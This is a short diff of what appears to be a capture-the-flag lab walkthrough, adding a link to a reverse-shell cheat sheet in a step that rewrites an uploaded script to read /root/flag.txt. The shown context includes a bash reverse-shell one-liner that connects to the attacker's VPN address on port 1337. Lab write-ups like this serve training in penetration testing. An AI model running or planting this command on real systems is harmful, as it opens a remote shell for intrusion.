@@ -478,7 +478,7 @@ In this task we will be using `nmap` to find more information on the target mach
 
 4. Re-upload this script to contain malicious data (just like we did in section 9.6. Output the contents of /root/flag.txt!
 
-   First we need to add our malicious payload to the script. From the [Cheat sheet]() we can add the following to our script to get us a reverse shell. We need to add our IP address (with the VPN in this case) and a port for us to listen on.
+   First we need to add our malicious payload to the script. From the [Cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp) we can add the following to our script to get us a reverse shell. We need to add our IP address (with the VPN in this case) and a port for us to listen on.
    
    ```cmd
    bash -i >& /dev/tcp/10.18.78.136/1337 0>&1
